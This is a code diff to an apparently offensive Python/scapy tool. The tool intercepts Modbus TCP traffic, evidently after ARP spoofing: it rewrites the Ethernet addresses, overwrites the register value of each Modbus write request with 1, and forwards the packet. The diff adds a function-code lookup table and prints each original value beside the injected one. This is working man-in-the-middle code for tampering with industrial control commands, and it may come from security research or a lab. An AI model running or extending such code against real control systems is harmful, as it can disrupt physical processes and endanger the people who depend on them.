@@ -26,6 +26,7 @@ import threading
 import time
 from datetime import datetime, timezone
 
+
 try:
     from scapy.all import (
         sniff, sr1, send, ARP, Ether, TCP, IP, Raw, conf, get_if_hwaddr,sendp,sr
@@ -36,6 +37,29 @@ except ImportError:
     sys.exit(1)
 
 VERSION="0.1"
+
+MODBUS_FUNCTION_CODES = {
+    0x01: "Read Coils",
+    0x02: "Read Discrete Inputs",
+    0x03: "Read Holding Registers",
+    0x04: "Read Input Registers",
+    0x05: "Write Single Coil",
+    0x06: "Write Single Register",
+    0x07: "Read Exception Status",
+    0x08: "Diagnostics",
+    0x0B: "Get Comm Event Counter",
+    0x0C: "Get Comm Event Log",
+    0x0F: "Write Multiple Coils",
+    0x10: "Write Multiple Registers",
+    0x11: "Report Server ID",
+    0x14: "Read File Record",
+    0x15: "Write File Record",
+    0x16: "Mask Write Register",
+    0x17: "Read/Write Multiple Registers",
+    0x18: "Read FIFO Queue",
+    0x2B: "Encapsulated Interface Transport",
+}
+
 
 def log_line(msg, log_file=None):
     line = f"[{datetime.now(timezone.utc).isoformat(timespec='seconds')}] {msg}"
@@ -82,24 +106,19 @@ def handle_packet(pkt, port, log_file,mappings,own_mac):
     src = own_mac
     dst = pkt[IP].dst 
 
-    print("Source: "+src)
-    print("Dest: "+str(mappings[dst]))
+    # print("Source: "+src)
+    # print("Dest: "+str(mappings[dst]))
 
     npkt=pkt #TODO: test if i really need to create a new var here, or if i can use pkt
     npkt[Ether].src=src
     npkt[Ether].dst=mappings[dst]
-    # print(npkt.show(dump=True))
-
-    # if not (npkt.haslayer(TCP) and npkt.haslayer(IP)):
-    #     sendp(npkt,loop=0,inter=0.2)
-    #     return
 
     if npkt.haslayer(ModbusADURequest):
         mb = npkt[ModbusADURequest]
     # elif npkt.haslayer(ModbusADUResponse):
     #     mb = npkt[ModbusADUResponse]
     else:
-        sendp(npkt,loop=0,inter=0.2)
+        sendp(npkt,loop=0,inter=0.2,verbose=0)
         return
 
     tcp = npkt[TCP]
@@ -113,8 +132,12 @@ def handle_packet(pkt, port, log_file,mappings,own_mac):
 
     
     if npkt.haslayer(ModbusADURequest):
-        npkt[ModbusADURequest].registerValue=1
-        print(f"Register Value: ",npkt[ModbusADURequest].registerValue)
+        original_value = npkt[ModbusADURequest].registerValue
+        npkt[ModbusADURequest].registerValue=1 # new value
+        print("\nFunction:\t\t" + MODBUS_FUNCTION_CODES.get(npkt[ModbusADURequest].funcCode))
+        print("Register Address:\t",npkt[ModbusADURequest].registerAddr)
+        print("Original Value:\t\t",original_value)
+        print("New Value:\t\t",npkt[ModbusADURequest].registerValue)
         # npkt[ModbusADURequest].transId=4660
     # elif npkt.haslayer(ModbusADUResponse):
     #     npkt[ModbusADUResponse].registerValue=1
@@ -126,7 +149,7 @@ def handle_packet(pkt, port, log_file,mappings,own_mac):
     del npkt[IP].chksum
 
     # print(npkt.show(dump=True))
-    sendp(npkt,loop=0,inter=0.2)
+    sendp(npkt,loop=0,inter=0.2,verbose=0)
 
 def banner():
     print(f'''                                                                                                 
